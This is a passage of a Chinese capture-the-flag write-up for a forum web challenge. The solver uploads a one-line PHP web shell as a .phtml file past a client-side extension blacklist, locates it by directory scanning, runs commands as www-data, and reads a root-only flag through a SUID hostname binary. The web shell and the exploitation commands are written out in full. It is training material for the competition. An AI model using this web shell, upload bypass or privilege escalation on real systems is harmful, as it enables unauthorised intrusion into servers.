UPLOAD:<!DOCTYPE html> <html lang="zh-CN"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>公告 - Moe Forum</title> <link rel="stylesheet" href="/assets/style.css"> </head> <body> <div class="container"> <header> <h1><a href="/forum.php">Moe Forum</a></h1> <p class="subtitle">A simple 交流社区</p> <nav> <a href="/forum.php">论坛</a> <a href="/announcements.php">公告</a> <a href="/share.php">用户主页</a> <a href="/new_post.php">发帖</a> <a href="/admin/">管理后台</a> <span class="user-info">admin</span> <a href="/logout.php">退出</a> </nav> </header> <main> <div class="card"> <h2>管理员公告</h2> <div class="announcement"> <h3>AUTO_PHTML</h3> <p class="post-meta">2026-08-23 16:44:08</p> <div style="margin-top:10px; line-height:1.7;"> &lt;?php system($_GET[&#039;cmd&#039;]??&#039;id&#039;); ?&gt; </div> </div> <div class="announcement"> <h3>欢迎公告</h3> <p class="post-meta">2026-08-23 16:13:38</p> <div style="margin-top:10px; line-height:1.7;"> <h1>欢迎来到 Moe Forum</h1><br /> <br /> &gt; 管理员公告频道<br /> <br /> <h2>规则</h2><br /> 1. 友好交流，文明发帖<br /> 2. 禁止刷屏和广告<br /> 3. 分享有价值的技术内容<br /> <br /> 如有问题请联系管理员。<br /> <br /> <hr><br /> <em>Moe Forum Admin Team</em> </div> </div> </div> </main> <footer> <p>Moe Forum v1.0 &middot; Powered by SQLite</p> </footer> </div> </body> </html>
```

再重新看 `/admin` 面板 :

```html
ADMIN:<!DOCTYPE html> <html lang="zh-CN"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>管理后台 - Moe Forum</title> <link rel="stylesheet" href="/assets/style.css"> </head> <body> <div class="container"> <header> <h1><a href="/forum.php">Moe Forum</a></h1> <p class="subtitle">A simple 交流社区</p> <nav> <a href="/forum.php">论坛</a> <a href="/announcements.php">公告</a> <a href="/share.php">用户主页</a> <a href="/new_post.php">发帖</a> <a href="/admin/">管理后台</a> <span class="user-info">admin</span> <a href="/logout.php">退出</a> </nav> </header> <main> <div class="admin-section"> <h2>管理后台</h2> <p>欢迎回来，管理员。在这里可以管理论坛公告。</p> <p>管理的智慧：找不到的时候要善用工具</p> </div> <div class="admin-section"> <h2>发布公告</h2> <p>上传 Markdown 文件来发布公告（仅支持 .md 文件）。</p> <form id="uploadForm" action="/admin/upload.php" method="POST" enctype="multipart/form-data"> <div class="form-group"> <label>公告标题</label> <input type="text" name="title" placeholder="公告标题" required> </div> <div class="form-group"> <label>选择文件</label> <input type="file" name="file" id="fileInput" accept=".md,.markdown" required> <p class="upload-info">支持格式：.md &middot; 文件将被保存在服务器并展示在公告页。</p> <div id="fileError" class="alert alert-error" style="display:none;"></div> </div> <button type="submit" class="btn">上传发布</button> </form> </div> <div class="admin-section"> <h2>已发布公告</h2> <table style="width:100%; border-collapse:collapse;"> <tr style="text-align:left; border-bottom:2px solid #c8dcc8;"> <th style="padding:8px;">标题</th> <th style="padding:8px;">文件</th> <th style="padding:8px;">时间</th> </tr> <tr style="border-bottom:1px solid #e0e8e0;"> <td style="padding:8px;">AUTO_PHTML</td> <td style="padding:8px; font-family:monospace; font-size:0.85em;">20260823_164408_81eb35f8.phtml</td> <td style="padding:8px; font-size:0.85em; color:#aaa;">2026-08-23 16:44:08</td> </tr> <tr style="border-bottom:1px solid #e0e8e0;"> <td style="padding:8px;">欢迎公告</td> <td style="padding:8px; font-family:monospace; font-size:0.85em;">welcome.md</td> <td style="padding:8px; font-size:0.85em; color:#aaa;">2026-08-23 16:13:38</td> </tr> </table> </div> </main> <footer> <p>Moe Forum v1.0 &middot; Powered by SQLite</p> </footer> </div> </body> </html> <script> (function () { var blacklist = ['php', 'php3', 'php4', 'php5', 'php7', 'phps','.htaccess'];// Same as backend var form = document.getElementById('uploadForm'); var fileInput = document.getElementById('fileInput'); var errorBox = document.getElementById('fileError'); form.addEventListener('submit', function (e) { var filename = fileInput.value; if (!filename) return; var ext = filename.split('.').pop().toLowerCase(); if (blacklist.indexOf(ext) !== -1) { e.preventDefault(); errorBox.textContent = '非法文件类型！PHP文件不允许上传。'; errorBox.style.display = 'block'; fileInput.value = ''; } else { errorBox.style.display = 'none'; } }); fileInput.addEventListener('change', function () { errorBox.style.display = 'none'; }); })(); </script>
```

多了个 `20260823_164408_81eb35f8.phtml` 文件，再结合前面 `dirsearch` 扫到的目录开始找文件位置

```bash
(venv) resi@MacBook-Air db % sed 's#^#/#; s#$#/20260823_164408_81eb35f8.phtml#' dicc.txt > paths.txt

[00:53:44] 200 -    54B - /fileadmin/user_upload//20260823_164408_81eb35f8.phtml
```

扫出来在 `/fileadmin/user_upload//20260823_164408_81eb35f8.phtml`

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功 `RCE`

```
?cmd=ls%20/

bin boot dev entrypoint.sh etc f139 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

`f139` 大概就是 `flag` ，直接 `cat` 没反应

```
?cmd=ls%20-la%20/f139

-rwx------ 1 root root 44 Aug 23 16:13 /f139
```

`root` 才能读，要提权

### 提权

`sudo -l` 没反应

找 `SUID` 文件 :

```
find / -perm -u=s -type f 2>/dev/null

/usr/bin/mount /usr/bin/passwd /usr/bin/hostname /usr/bin/su /usr/bin/chsh /usr/bin/chfn /usr/bin/gpasswd /usr/bin/umount /usr/bin/newgrp /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

注意到 `hostname` 拥有 `SUID root` 权限。比赛记录中使用下面的命令读取 `/f139`，返回了倒序的 flag

```
?cmd=/usr/bin/hostname%20/f139

}ab35324e7676-5c6c-f96c-639e-c104ace5{ftceom
```

反转一下得到 `flag`

### Flag

```
moectf{5eca401c-e936-c69f-c6c5-6767e42353ba}
```
